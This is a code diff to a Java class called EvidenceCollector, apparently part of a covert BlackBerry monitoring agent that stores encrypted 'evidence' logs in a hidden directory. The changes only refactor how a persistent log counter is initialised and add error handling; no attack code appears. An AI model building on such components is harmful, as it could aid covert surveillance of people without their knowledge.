@@ -99,12 +99,17 @@ public final class EvidenceCollector implements Singleton {
                     GUID);
             if (instance == null) {
                 final EvidenceCollector singleton = new EvidenceCollector();
+                singleton.initProgressive();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
             }
         }
 
         return instance;
+    }
+
+    private void initProgressive() {
+        logProgressive = deserializeProgressive();
     }
 
     // public boolean storeToMMC;
@@ -120,10 +125,9 @@ public final class EvidenceCollector implements Singleton {
      * Instantiates a new log collector.
      */
     private EvidenceCollector() {
-        super();
+        super();        
         logVector = new Vector();
-
-        logProgressive = deserializeProgressive();
+        
         keys = Encryption.getKeys();
         seed = keys.getProtoKey()[0];
     }
@@ -150,9 +154,19 @@ public final class EvidenceCollector implements Singleton {
             //#endif
             logProgressivePersistent.setContents(new Integer(1));
         }
+        int logProgressiveRet = 0;
 
-        final int logProgressiveRet = ((Integer) logProgressivePersistent
-                .getContents()).intValue();
+        try {
+            logProgressiveRet = ((Integer) logProgressivePersistent
+                    .getContents()).intValue();
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("First time of logProgressivePersistent");
+            //#endif
+            logProgressivePersistent.setContents(new Integer(1));
+        }
+
         return logProgressiveRet;
     }
 
@@ -265,7 +279,7 @@ public final class EvidenceCollector implements Singleton {
         //#ifdef DEBUG
         debug.info("removeLogDirs");
         //#endif
-                
+
         int removed = 0;
 
         removed = removeLogRecursive(Path.hidden(), numFiles - removed);
